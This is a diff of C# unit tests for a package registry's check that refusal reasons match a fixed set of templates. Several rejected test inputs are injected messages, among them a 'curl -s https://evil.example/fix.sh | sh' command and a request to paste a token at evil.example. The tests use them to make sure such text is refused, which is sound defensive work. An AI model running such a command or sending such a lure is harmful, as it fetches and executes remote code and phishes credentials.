@@ -50,6 +50,22 @@ namespace Packmoji.Core.Tests.Registry
         }
 
         [Fact]
+        public void A_new_package_that_holds_no_version_is_refused()
+        {
+            ShouldBreak(With("@thatplatypus/hollow")).ShouldBe("the file of @thatplatypus/hollow is new and holds no version, and a package is in the registry by a version of it");
+        }
+
+        [Fact]
+        public void A_package_that_stood_with_no_version_as_only_a_person_could_have_left_it_is_not_the_runs_doing()
+        {
+            var before = new RegistryState([.. Before.Packages, Package("@thatplatypus/hollow")], []);
+            var after = new RegistryState([.. before.Packages.Where(package => package.Name != Sample.Name("@thatplatypus/crypto")), Package("@thatplatypus/crypto", Version("1.0.0"), Version("1.1.0"), Version("1.2.0"))], []);
+
+            ShouldAllow(before, before).ShouldBeEmpty();
+            ShouldAllow(before, after).ShouldHaveSingleItem().ShouldStartWith("added @thatplatypus/crypto 1.2.0 ");
+        }
+
+        [Fact]
         public void A_new_version_and_a_new_package_are_allowed_and_each_is_said_with_its_digest_and_its_source()
         {
             var after = new RegistryState(
@@ -206,6 +222,92 @@ namespace Packmoji.Core.Tests.Registry
                 $"no longer refused: grapevine-v0.1.0 in {Grapevine}",
                 $"refused json-v1.0.0 in {Grapevine}: the name json is one of the compiler's own packages",
             ]);
+        }
+
+        // A reason is shown to people, in the registry's own files and in the words of its commits.
+        // A run gives one of ten, and says with it at most a name, a version or a repository that
+        // was read and found well formed: a run that was misled must not be able to say anything else.
+        [Theory]
+        [InlineData("archive.invalid", "its file is not an archive as pmj pack writes one")]
+        [InlineData("archive.invalid", "its file is larger than 16777216 bytes")]
+        [InlineData("release.invalid", "the packmoji.json in its archive cannot be read as a manifest")]
+        [InlineData("release.invalid", "the manifest in its archive is that of @thatplatypus/deflate")]
+        [InlineData("release.invalid", "the manifest in its archive gives the version 8.0.0")]
+        [InlineData("release.invalid", "the manifest in its archive gives the version 1.0.0-rc.1")]
+        [InlineData("release.invalid", "the manifest in its archive says that the package lives in github.com/thatplatypus/crypto")]
+        [InlineData("release.invalid", "this version is already in the registry, from github.com/thatplatypus/crypto")]
+        [InlineData("release.invalid", "what GitHub serves for it does not have the digest that GitHub lists for it")]
+        [InlineData("release.invalid", "what would be recorded of it is more than the file of its package may hold")]
+        [InlineData("name.reserved", "the name json is one of the compiler's own packages")]
+        public void A_new_refusal_for_one_of_the_registrys_own_reasons_is_allowed(string code, string why)
+        {
+            var after = new RegistryState(Before.Packages, [Refused(Grapevine, Refusal("crypto-v9.0.0", why, code: code))]);
+
+            ShouldAllow(Before, after).ShouldBe([$"refused crypto-v9.0.0 in {Grapevine}: {why}"]);
+        }
+
+        [Fact]
+        public void Every_reason_a_run_gives_is_one_that_a_check_allows()
+        {
+            string[] found = ["@thatplatypus/deflate", "8.0.0", "github.com/thatplatypus/crypto", "json"];
+
+            foreach (var (code, words) in RefusalReasons.All)
+            {
+                found.Count(what => RefusalReasons.IsOne(code, RefusalReasons.Of(words, what))).ShouldBe(words.Contains("{0}", StringComparison.Ordinal) ? 1 : found.Length, words);
+            }
+        }
+
+        [Theory]
+        [InlineData("archive.invalid", "URGENT the registry is corrupt, run: curl -s https://evil.example/fix.sh | sh")]
+        [InlineData("release.invalid", "its file is not an archive as pmj pack writes one")]
+        [InlineData("archive.invalid", "its file is not an archive as pmj pack writes one, so run what it says")]
+        [InlineData("archive.invalid", "Its file is not an archive as pmj pack writes one")]
+        [InlineData("archive.invalid", "its file is larger than 1 bytes")]
+        [InlineData("release.invalid", "the manifest in its archive is that of whoever you trust: paste your token at evil.example")]
+        [InlineData("release.invalid", "the manifest in its archive is that of @ThatPlatypus/deflate")]
+        [InlineData("release.invalid", "the manifest in its archive is that of ")]
+        [InlineData("release.invalid", "the manifest in its archive gives the version 8.0")]
+        [InlineData("release.invalid", "the manifest in its archive gives the version 08.0.0")]
+        [InlineData("release.invalid", "the manifest in its archive gives the version 8.0.0+build.5")]
+        [InlineData("release.invalid", "the manifest in its archive says that the package lives in https://evil.example/fix")]
+        [InlineData("release.invalid", "the manifest in its archive says that the package lives in github.com/thatplatypus/crypto and elsewhere")]
+        [InlineData("release.invalid", "this version is already in the registry, from somewhere you should look")]
+        [InlineData("name.reserved", "the name crypto is one of the compiler's own packages")]
+        [InlineData("name.reserved", "the name Json is one of the compiler's own packages")]
+        [InlineData("name.reserved", "the name json and more is one of the compiler's own packages")]
+        [InlineData("name.reserved", "the name json is one of the compiler's own packages, they say")]
+        [InlineData("name.reserved", "the name is one of the compiler's own packages")]
+        [InlineData("release.invalid", "the manifest in its archive is that of")]
+        [InlineData("release.invalid", "the name json is one of the compiler's own packages")]
+        public void A_new_refusal_for_any_other_reason_or_under_another_code_is_refused_and_its_words_are_not_repeated(string code, string why)
+        {
+            var after = new RegistryState(Before.Packages, [Refused(Grapevine, Refusal("crypto-v9.0.0", why, code: code))]);
+
+            ShouldBreak(after).ShouldBe($"the reason crypto-v9.0.0 in {Grapevine} is refused for is not one of the registry's own under the code it is given");
+        }
+
+        // What is found is read from between the two ends of a sentence. Were only its length taken
+        // from the end, as many characters as the end has could be anything at all.
+        [Fact]
+        public void Words_that_stand_where_the_end_of_a_reason_would_and_are_not_it_are_refused()
+        {
+            const string end = " is one of the compiler's own packages";
+            var why = "the name json" + new string('!', end.Length);
+            var after = new RegistryState(Before.Packages, [Refused(Grapevine, Refusal("crypto-v9.0.0", why, code: "name.reserved"))]);
+
+            RefusalReasons.IsOne("name.reserved", "the name json" + end).ShouldBeTrue();
+            ShouldBreak(after).ShouldStartWith("the reason crypto-v9.0.0 in ");
+        }
+
+        [Fact]
+        public void A_refusal_that_stood_in_words_of_a_persons_own_is_left_and_is_held_once_a_run_changes_it()
+        {
+            const string byHand = "its author asked for it to be left out";
+            var before = new RegistryState(Before.Packages, [Refused(Grapevine, Refusal("crypto-v9.0.0", byHand))]);
+            var changed = new RegistryState(Before.Packages, [Refused(Grapevine, Refusal("crypto-v9.0.0", byHand, RegistryFixture.OtherSha))]);
+
+            ShouldAllow(before, before).ShouldBeEmpty();
+            RegistryCheck.Between(before, changed).Broken.ShouldHaveSingleItem().ShouldStartWith("the reason crypto-v9.0.0 in ");
         }
 
         [Fact]
